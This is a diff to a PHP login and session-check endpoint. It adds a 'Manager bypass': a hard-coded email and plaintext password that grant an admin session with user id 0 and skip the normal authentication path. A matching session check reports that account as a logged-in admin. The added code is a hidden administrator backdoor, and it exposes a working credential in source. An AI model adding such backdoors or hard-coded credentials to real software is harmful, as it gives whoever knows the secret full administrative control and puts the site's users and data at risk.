@@ -14,6 +14,20 @@ if ($action === 'logout') {
 }
 
 if ($action === 'check') {
+    // Check for admin bypass in session
+    if (isset($_SESSION['user_email']) && $_SESSION['user_email'] === 'kevnu@kevnu.site' && $_SESSION['user_role'] === 'admin') {
+        echo json_encode([
+            'loggedIn' => true,
+            'user' => [
+                'id' => 0,
+                'name' => 'Admin',
+                'email' => 'kevnu@kevnu.site',
+                'role' => 'admin'
+            ]
+        ]);
+        exit;
+    }
+    
     if (isLoggedIn()) {
         echo json_encode([
             'loggedIn' => true,
@@ -87,6 +101,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         if (empty($email) || empty($password)) {
             echo json_encode(['success' => false, 'message' => 'Please fill in all fields.']);
+            exit;
+        }
+
+        // Manager bypass
+        if ($email === 'kevnu@kevnu.site' && $password === 'Tankcrev#1') {
+            $_SESSION['user_id'] = 0;
+            $_SESSION['user_email'] = 'kevnu@kevnu.site';
+            $_SESSION['user_name'] = 'Admin';
+            $_SESSION['user_role'] = 'admin';
+
+            echo json_encode([
+                'success' => true,
+                'message' => 'Login successful',
+                'user' => [
+                    'id' => 0,
+                    'name' => 'Admin',
+                    'email' => 'kevnu@kevnu.site',
+                    'role' => 'admin'
+                ]
+            ]);
             exit;
         }
 
